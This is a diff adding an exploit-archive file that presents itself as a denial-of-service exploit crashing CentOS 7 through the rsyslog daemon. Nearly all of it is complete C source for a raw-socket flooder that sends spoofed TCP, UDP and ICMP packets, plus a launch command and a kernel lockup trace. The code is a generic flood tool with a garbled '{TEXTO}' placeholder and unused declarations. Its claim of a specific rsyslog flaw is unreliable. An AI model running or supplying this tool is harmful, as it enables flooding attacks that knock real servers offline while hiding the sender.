@@ -1,0 +1,456 @@
+#####
+#Exploit Title: CentOS7 Kernel Crashing by rsyslog daemon vulnerability | DOS on CentOS7
+#Exploit Author: Hosein Askari (FarazPajohan)
+#Vendor HomePage: https://www.centos.org/
+#Version : 7
+#Tested on: Parrot OS
+#Date: 12-2-2017
+#Category: Operating System
+#Vulnerable Daemon: RSYSLOG
+#Author Mail :hosein.askari@aol.com
+#Description:
+#The CentOS7's kernel is disrupted by vulnerability on rsyslog daemon, in which the cpu usage will be 100% until the remote exploit launches on the victim's #server.
+****************************
+#Exploit Command :
+# ~~~#exploit.out -T3 -h <victim_ip> -p [514,514] // You can run this exploit on both "514 TCP/UDP"
+#
+#Exploit Code :
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <netdb.h>
+#include <sys/types.h>
+#ifdef F_PASS
+#include <sys/stat.h>
+#endif
+#include <netinet/in_systm.h>
+#include <sys/socket.h>
+#include <string.h>
+#include <time.h>
+#ifndef __USE_BSD
+# define __USE_BSD
+#endif
+#ifndef __FAVOR_BSD
+# define __FAVOR_BSD
+#endif
+#include <netinet/in.h>
+#include <netinet/ip.h>
+#include <netinet/tcp.h>
+#include <netinet/udp.h>
+#include <netinet/ip_icmp.h>
+#include <arpa/inet.h>
+#ifdef LINUX
+# define FIX(x) htons(x)
+#else
+# define FIX(x) (x)
+#endif
+#define TCP_ACK 1
+#define TCP_FIN 2
+#define TCP_SYN 4
+#define TCP_RST 8
+#define UDP_CFF 16
+#define ICMP_ECHO_G 32
+#define TCP_NOF 64
+#define TCP_URG 128
+#define TH_NOF 0x0
+#define TCP_ATTACK() (a_flags & TCP_ACK ||\
+a_flags & TCP_FIN ||\
+a_flags & TCP_SYN ||\
+a_flags & TCP_RST ||\
+a_flags & TCP_NOF ||\
+a_flags & TCP_URG )
+#define UDP_ATTACK() (a_flags & UDP_CFF)
+#define ICMP_ATTACK() (a_flags & ICMP_ECHO_G)
+#define CHOOSE_DST_PORT() dst_sp == 0 ?\
+random () :\
+htons(dst_sp + (random() % (dst_ep -dst_sp +1)));
+#define CHOOSE_SRC_PORT() src_sp == 0 ?\
+random () :\
+htons(src_sp + (random() % (src_ep -src_sp +1)));
+#define SEND_PACKET() if (sendto(rawsock,\
+&packet,\
+(sizeof packet),\
+0,\
+(struct sockaddr *)&target,\
+sizeof target) < 0) {\
+perror("sendto");\
+exit(-1);\
+}
+#define BANNER_CKSUM 54018
+u_long lookup(const char *host);
+unsigned short in_cksum(unsigned short *addr, int len);
+static void inject_iphdr(struct ip *ip, u_char p, u_char len);
+char *class2ip(const char *class);
+static void send_tcp(u_char th_flags);
+static void send_udp(u_char garbage);
+static void send_icmp(u_char garbage);
+char *get_plain(const char *crypt_file, const char *xor_data_key);
+static void usage(const char *argv0);
+u_long dstaddr;
+u_short dst_sp, dst_ep, src_sp, src_ep;
+char *src_class, *dst_class;
+int a_flags, rawsock;
+struct sockaddr_in target;
+const char *banner = "Written By C0NSTANTINE";
+struct pseudo_hdr {
+u_long saddr, daddr;
+u_char mbz, ptcl;
+u_short tcpl;
+};
+struct cksum {
+struct pseudo_hdr pseudo;
+struct tcphdr tcp;
+};
+struct {
+int gv;
+int kv;
+void (*f)(u_char);
+} a_list[] = {
+{ TCP_ACK, TH_ACK, send_tcp },
+{ TCP_FIN, TH_FIN, send_tcp },
+{ TCP_SYN, TH_SYN, send_tcp },
+{ TCP_RST, TH_RST, send_tcp },
+{ TCP_NOF, TH_NOF, send_tcp },
+{ TCP_URG, TH_URG, send_tcp },
+{ UDP_CFF, 0, send_udp },
+{ ICMP_ECHO_G, ICMP_ECHO, send_icmp },
+{ 0, 0, (void *)NULL },
+};
+int
+main(int argc, char *argv[])
+{
+int n, i, on = 1;
+int b_link;
+#ifdef F_PASS
+struct stat sb;
+#endif
+unsigned int until;
+a_flags = dstaddr = i = 0;
+dst_sp = dst_ep = src_sp = src_ep = 0;
+until = b_link = -1;
+src_class = dst_class = NULL;
+while ( (n = getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) != -1) {
+char *p;
+switch (n) {
+case 'T':
+switch (atoi(optarg)) {
+case 0: a_flags |= TCP_ACK; break;
+case 1: a_flags |= TCP_FIN; break;
+case 2: a_flags |= TCP_RST; break;
+case 3: a_flags |= TCP_SYN; break;
+
+case 4: a_flags |= TCP_URG; break;
+
+
+}
+break;
+case 'U':
+a_flags |= UDP_CFF;
+break;
+case 'I':
+a_flags |= ICMP_ECHO_G;
+break;
+case 'N':
+a_flags |= TCP_NOF;
+break;
+case 's':
+src_class = optarg;
+break;
+case 'h':
+dstaddr = lookup(optarg);
+break;
+case 'd':
+dst_class = optarg;
+i = 1;
+break;
+case 'p':
+if ( (p = (char *) strchr(optarg, ',')) == NULL)
+usage(argv[0]);
+dst_sp = atoi(optarg);
+dst_ep = atoi(p +1);
+break;
+case 'q':
+if ( (p = (char *) strchr(optarg, ',')) == NULL)
+usage(argv[0]);
+src_sp = atoi(optarg);
+src_ep = atoi(p +1);
+break;
+case 'l':
+b_link = atoi(optarg);
+if (b_link <= 0 || b_link > 100)
+usage(argv[0]);
+break;
+case 't':
+until = time(0) +atoi(optarg);
+break;
+default:
+usage(argv[0]);
+break;
+}
+}
+if ( (!dstaddr && !i) ||
+(dstaddr && i) ||
+(!TCP_ATTACK() && !UDP_ATTACK() && !ICMP_ATTACK()) ||
+(src_sp != 0 && src_sp > src_ep) ||
+(dst_sp != 0 && dst_sp > dst_ep))
+usage(argv[0]);
+srandom(time(NULL) ^ getpid());
+if ( (rawsock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
+perror("socket");
+exit(-1);
+}
+if (setsockopt(rawsock, IPPROTO_IP, IP_HDRINCL,
+(char *)&on, sizeof(on)) < 0) {
+perror("setsockopt");
+exit(-1);
+}
+target.sin_family = AF_INET;
+for (n = 0; ; ) {
+if (b_link != -1 && random() % 100 +1 > b_link) {
+if (random() % 200 +1 > 199)
+usleep(1);
+continue;
+}
+for (i = 0; a_list[i].f != NULL; ++i) {
+if (a_list[i].gv & a_flags)
+a_list[i].f(a_list[i].kv);
+}
+if (n++ == 100) {
+if (until != -1 && time(0) >= until) break;
+n = 0;
+}
+}
+exit(0);
+}
+u_long
+lookup(const char *host)
+{
+struct hostent *hp;
+
+if ( (hp = gethostbyname(host)) == NULL) {
+perror("gethostbyname");
+exit(-1);
+}
+return *(u_long *)hp->h_addr;
+}
+#define RANDOM() (int) random() % 255 +1
+char *
+class2ip(const char *class)
+{
+static char ip[16];
+int i, j;
+
+for (i = 0, j = 0; class[i] != '{TEXTO}'; ++i)
+if (class[i] == '.')
+++j;
+switch (j) {
+case 0:
+sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM());
+break;
+case 1:
+sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM());
+break;
+case 2:
+sprintf(ip, "%s.%d", class, RANDOM());
+break;
+default: strncpy(ip, class, 16);
+break;
+}
+return ip;
+}
+unsigned short
+in_cksum(unsigned short *addr, int len)
+{
+int nleft = len;
+int sum = 0;
+unsigned short *w = addr;
+unsigned short answer = 0;
+while (nleft > 1) {
+sum += *w++;
+nleft -= 2;
+}
+if (nleft == 1) {
+*(unsigned char *) (&answer) = *(unsigned char *)w;
+sum += answer;
+}
+sum = (sum >> 16) + (sum & 0xffff);
+sum += (sum >> 16);
+answer = ~sum;
+return answer;
+}
+static void
+inject_iphdr(struct ip *ip, u_char p, u_char len)
+{
+ip->ip_hl = 5;
+ip->ip_v = 4;
+ip->ip_p = p;
+ip->ip_tos = 0x08; /* 0x08 */
+ip->ip_id = random();
+ip->ip_len = len;
+ip->ip_off = 0;
+ip->ip_ttl = 255;
+ip->ip_dst.s_addr = dst_class != NULL ?
+inet_addr(class2ip(dst_class)) :
+dstaddr;
+ip->ip_src.s_addr = src_class != NULL ?
+inet_addr(class2ip(src_class)) :
+random();
+target.sin_addr.s_addr = ip->ip_dst.s_addr;
+}
+static void
+send_tcp(u_char th_flags)
+{
+struct cksum cksum;
+struct packet {
+struct ip ip;
+struct tcphdr tcp;
+} packet;
+memset(&packet, 0, sizeof packet);
+inject_iphdr(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
+packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20);
+cksum.pseudo.daddr = dstaddr;
+cksum.pseudo.mbz = 0;
+cksum.pseudo.ptcl = IPPROTO_TCP;
+cksum.pseudo.tcpl = htons(sizeof(struct tcphdr));
+cksum.pseudo.saddr = packet.ip.ip_src.s_addr;
+packet.tcp.th_flags = random();
+packet.tcp.th_win = random();
+packet.tcp.th_seq = random();
+packet.tcp.th_ack = random();
+packet.tcp.th_off = 5;
+packet.tcp.th_urp = 0;
+packet.tcp.th_sport = CHOOSE_SRC_PORT();
+packet.tcp.th_dport = CHOOSE_DST_PORT();
+cksum.tcp = packet.tcp;
+packet.tcp.th_sum = in_cksum((void *)&cksum, sizeof(cksum));
+SEND_PACKET();
+}
+static void
+send_udp(u_char garbage)
+{
+struct packet {
+struct ip ip;
+struct udphdr udp;
+} packet;
+memset(&packet, 0, sizeof packet);
+inject_iphdr(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
+packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20);
+packet.udp.uh_sport = CHOOSE_SRC_PORT();
+packet.udp.uh_dport = CHOOSE_DST_PORT();
+packet.udp.uh_ulen = htons(sizeof packet.udp);
+packet.udp.uh_sum = 0;
+SEND_PACKET();
+}
+static void
+send_icmp(u_char gargabe)
+{
+struct packet {
+struct ip ip;
+struct icmp icmp;
+} packet;
+memset(&packet, 0, sizeof packet);
+inject_iphdr(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
+packet.ip.ip_sum = in_cksum((void *)&packet.ip, 20);
+packet.icmp.icmp_type = ICMP_ECHO;
+packet.icmp.icmp_code = 0;
+packet.icmp.icmp_cksum = htons( ~(ICMP_ECHO << 8));
+for(int pp=0;pp<=1000;pp++)
+{SEND_PACKET();
+pp++;
+}
+}
+static void
+usage(const char *argv0)
+{
+printf("%s \n", banner);
+printf(" -U UDP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
+printf(" -I ICMP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
+printf(" -N Bogus attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
+printf(" -T TCP attack \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, 4:URG\e[1;37m]\e[0m\n");
+printf(" -h destination host/ip \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
+printf(" -d destination class \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
+printf(" -s source class/ip \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
+printf(" -p destination port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
+printf(" -q source port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
+printf(" -l pps limiter \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n");
+printf(" -t timeout \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
+printf("\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -U -I -h -p -t]\n", argv0);
+exit(-1);
+}
+
+********************************
+#Description :
+#The Sample Output of "dmesg" is shown below :
+
+[ 2613.161800] task: ffff88016f5cb980 ti: ffff88016f5e8000 task.ti: ffff88016f5e8000
+[ 2613.161801] RIP: 0010:[<ffffffffa016963a>] [<ffffffffa016963a>] e1000_xmit_frame+0xaca/0x10b0 [e1000]
+[ 2613.161808] RSP: 0018:ffff880172203530 EFLAGS: 00000286
+[ 2613.161809] RAX: ffffc90008fc3818 RBX: ffffffff00000000 RCX: ffff88016d220000
+[ 2613.161810] RDX: 0000000000000047 RSI: 00000000ffffffff RDI: ffff88016d220000
+[ 2613.161810] RBP: ffff8801722035b0 R08: 0000000000000000 R09: 0000000002000000
+[ 2613.161811] R10: 0000000000000000 R11: 0000000000000000 R12: ffff8801722034a8
+[ 2613.161812] R13: ffffffff8164655d R14: ffff8801722035b0 R15: 0000000000000000
+[ 2613.161813] FS: 0000000000000000(0000) GS:ffff880172200000(0000) knlGS:0000000000000000
+[ 2613.161813] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[ 2613.161814] CR2: 00007ff8367b1000 CR3: 000000016d143000 CR4: 00000000001407f0
+[ 2613.161886] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
+[ 2613.161912] DR3: 0000000000000000 DR6: 00000000ffff0ff0 DR7: 0000000000000400
+[ 2613.161913] Stack:
+[ 2613.161913] ffffffff81517cf7 ffff88016eab5098 000000468151a494 0000000800000000
+[ 2613.161915] 000000006d738000 ffff880100000000 0000000100001000 ffff88014e09d100
+[ 2613.161916] ffff8800358aeac0 ffff88016d220000 ffff88016eab5000 ffff88016d220000
+[ 2613.161918] Call Trace:
+[ 2613.161919] <IRQ>
+[ 2613.161923] [<ffffffff81517cf7>] ? kfree_skbmem+0x37/0x90
+[ 2613.161926] [<ffffffff8152c671>] dev_hard_start_xmit+0x171/0x3b0
+[ 2613.161929] [<ffffffff8154cd74>] sch_direct_xmit+0x104/0x200
+[ 2613.161931] [<ffffffff8152cae6>] dev_queue_xmit+0x236/0x570
+[ 2613.161933] [<ffffffff8156ae1d>] ip_finish_output+0x53d/0x7d0
+[ 2613.161934] [<ffffffff8156bdcf>] ip_output+0x6f/0xe0
+[ 2613.161936] [<ffffffff8156a8e0>] ? ip_fragment+0x8b0/0x8b0
+[ 2613.161937] [<ffffffff81569a41>] ip_local_out_sk+0x31/0x40
+[ 2613.161938] [<ffffffff8156c816>] ip_send_skb+0x16/0x50
+[ 2613.161940] [<ffffffff8156c883>] ip_push_pending_frames+0x33/0x40
+[ 2613.161942] [<ffffffff8159a79e>] icmp_push_reply+0xee/0x120
+[ 2613.161943] [<ffffffff8159ad18>] icmp_send+0x448/0x800
+[ 2613.161945] [<ffffffff8156c816>] ? ip_send_skb+0x16/0x50
+[ 2613.161946] [<ffffffff8159a79e>] ? icmp_push_reply+0xee/0x120
+[ 2613.161949] [<ffffffff8163cb5b>] ? _raw_spin_unlock_bh+0x1b/0x40
+[ 2613.161950] [<ffffffff8159aafc>] ? icmp_send+0x22c/0x800
+[ 2613.161952] [<ffffffffa05cf421>] reject_tg+0x3c1/0x4f8 [ipt_REJECT]
+[ 2613.161966] [<ffffffff81170002>] ? split_free_page+0x22/0x200
+[ 2613.161971] [<ffffffffa00920e0>] ipt_do_table+0x2e0/0x701 [ip_tables]
+[ 2613.161973] [<ffffffff81518e95>] ? skb_checksum+0x35/0x50
+[ 2613.161975] [<ffffffff81518ef0>] ? skb_push+0x40/0x40
+[ 2613.161976] [<ffffffff81517a70>] ? reqsk_fastopen_remove+0x140/0x140
+[ 2613.161978] [<ffffffff81520061>] ? __skb_checksum_complete+0x21/0xd0
+[ 2613.161981] [<ffffffffa03e2036>] iptable_filter_hook+0x36/0x80 [iptable_filter]
+[ 2613.161984] [<ffffffff8155c750>] nf_iterate+0x70/0xb0
+[ 2613.161985] [<ffffffff8155c838>] nf_hook_slow+0xa8/0x110
+[ 2613.161987] [<ffffffff81565f92>] ip_local_deliver+0xb2/0xd0
+[ 2613.161988] [<ffffffff81565ba0>] ? ip_rcv_finish+0x350/0x350
+[ 2613.161989] [<ffffffff815658cd>] ip_rcv_finish+0x7d/0x350
+[ 2613.161990] [<ffffffff81566266>] ip_rcv+0x2b6/0x410
+[ 2613.161992] [<ffffffff81565850>] ? inet_del_offload+0x40/0x40
+[ 2613.161993] [<ffffffff8152a882>] __netif_receive_skb_core+0x582/0x7d0
+[ 2613.161995] [<ffffffff8152aae8>] __netif_receive_skb+0x18/0x60
+[ 2613.161996] [<ffffffff8152ab70>] netif_receive_skb+0x40/0xc0
+[ 2613.161997] [<ffffffff8152b6e0>] napi_gro_receive+0x80/0xb0
+[ 2613.162001] [<ffffffffa016803d>] e1000_clean_rx_irq+0x2ad/0x580 [e1000]
+[ 2613.162005] [<ffffffffa016aa75>] e1000_clean+0x265/0x8e0 [e1000]
+[ 2613.162007] [<ffffffff8152afa2>] net_rx_action+0x152/0x240
+[ 2613.162009] [<ffffffff81084b0f>] __do_softirq+0xef/0x280
+[ 2613.162011] [<ffffffff8164721c>] call_softirq+0x1c/0x30
+[ 2613.162012] <EOI>
+[ 2613.162015] [<ffffffff81016fc5>] do_softirq+0x65/0xa0
+[ 2613.162016] [<ffffffff81084404>] local_bh_enable+0x94/0xa0
+[ 2613.162019] [<ffffffff81123f52>] rcu_nocb_kthread+0x232/0x370
+[ 2613.162021] [<ffffffff810a6ae0>] ? wake_up_atomic_t+0x30/0x30
+[ 2613.162022] [<ffffffff81123d20>] ? rcu_start_gp+0x40/0x40
+[ 2613.162024] [<ffffffff810a5aef>] kthread+0xcf/0xe0
+[ 2613.162026] [<ffffffff810a5a20>] ? kthread_create_on_node+0x140/0x140
+[ 2613.162028] [<ffffffff81645858>] ret_from_fork+0x58/0x90
+[ 2613.162029] [<ffffffff810a5a20>] ? kthread_create_on_node+0x140/0x140
+[ 2613.162030] Code: 14 48 8b 45 c8 48 8b 80 00 03 00 00 f6 80 98 00 00 00 03 74 16 48 8b 4d c8 41 0f b7 47 2a 41 8b 57 18 48 03 81 90 0c 00 00 89 10 <48> 83 c4 58 31 c0 5b 41 5c 41 5d 41 5e 41 5f 5d c3 0f 1f 44 00
+[ 2641.184338] BUG: soft lockup - CPU#0 stuck for 22s! [rcuos/0:138]
+#############################
